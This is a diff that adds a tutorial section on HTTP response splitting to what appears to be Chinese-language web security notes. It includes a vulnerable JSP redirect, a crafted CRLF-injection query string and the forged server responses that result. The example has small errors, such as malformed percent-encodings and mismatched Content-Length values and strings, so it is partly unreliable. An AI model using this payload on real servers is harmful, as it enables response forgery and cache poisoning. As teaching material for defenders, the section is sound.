@@ -44,3 +44,69 @@ DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直�
 Blind XSS
 --------------------------------
 Blind XSS是储存型XSS的一种，它保存在某些存储中，当一个“受害者”访问这个页面时执行，并且在文档对象模型（DOM）中呈现payload。 它被归类为盲目的原因是因为它通常发生在通常不暴露给用户的功能上。
+
+HTTP响应拆分
+--------------------------------
+造成http响应头截断漏洞的主要原因是对用户提交的非法字符没有进行严格的过滤，尤 其是CR,LF字符的输入。攻击者通过发送一经过精心构造的request，迫使服务器认为其返回的数据是两个响应，而不是常规的一个响应。基本技术http响应头截断攻击重点在于可以在http头中输入数据，构造特殊字符形成截断。最可能的是在Location字段,还有在Set-Cookie字段中。
+
+
+例如
+
+::
+
+		<% Response.sendRedirect(“/by_lang.jsp?lang=”+request.getParameter(“lang”)); %>
+
+		当提交english作为参数时，会转到/by_lang.jsp?lang=english,常规的响应如下：
+		HTTP/1.1 302 Moved Temporarily
+		Date:Wed,24 Dec 2003 12:53:28 
+		Location: http://10.1.1.1/by_lang.jsp?lang=english
+		Server: WebLogic XMLX Module 8.1 SP1 Fir Jun 20 23:06:40 PDT
+		2003 271009 with
+		Content-Type: text/html
+		Set-Cookie:    JSESSIONID=1PMRZOIQQzZIE6iivsREG82pq9B017h4YoHZ62RXjApqwBE!-
+		12510119693;path=/  Connection:Close
+
+		……………………….略
+		
+从以上可以看到的是：输入的参数已经提交到http头中，这样我们就可以构造特殊的字 符来截断http头，并到其后追加 一个自己构造的头:
+
+::
+
+		/redir_lang.jsp?lang=foobar%0d%0aContent-Length:%200%0d%0a%0d%oaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%Content-Length:%2019%0d%0a%0d%0a<html>Shazam</html>
+		
+服务器返回的数:
+
+::
+
+		HTTP/1.1 302 Moved Temporarily
+		Date:Wed,24 Dec 2003 15:26:41 GMT 
+		Location: http://10.1.1.1/by_lang.jsp?lang=foobar   
+		Content-Length:0
+
+		HTTP/1.1 200 OK
+		Content-Type: text/html
+		Content-length: 1
+		<html>Shazam</html>
+		Server: WebLogic XMLX Module 8.1 SP1 Fir Jun 20 23:06:40 PDT
+		2003 271009 with
+		Content-Type: text/html
+		Set-Cookie: JSESSIONID=1PMRZOIQQzZIE6iivsREG82pq9B017h4YoHZ62RXjApqwBE!-12510119693;path=/
+		Connection:Close
+		
+1、第一个响应是302 response，2、第二个响应是自己构造的200 response， 3、（在 报头之外的数据都略掉了，其实原文是存在的，而且在实际中该段是要给与考虑的）
+这样我们就可以发送两个请求：
+
+::
+
+		这样服务器对于第一个请求返回：
+		HTTP/1.1 302 Moved Temporar
+		Date:Wed,24 Dec 2003 15:26:41 GMT 
+		Location: http://10.1.1.1/by_lang.jsp?lang=foobar   
+		Content-Length:0
+		对于第二个请求返回：
+		HTTP/1.1 200 OK
+		Content-Type: text/html
+		Content-length: 19
+
+		<html>Shamaz</html>
+		这样就达到了欺骗目标服务器的目的
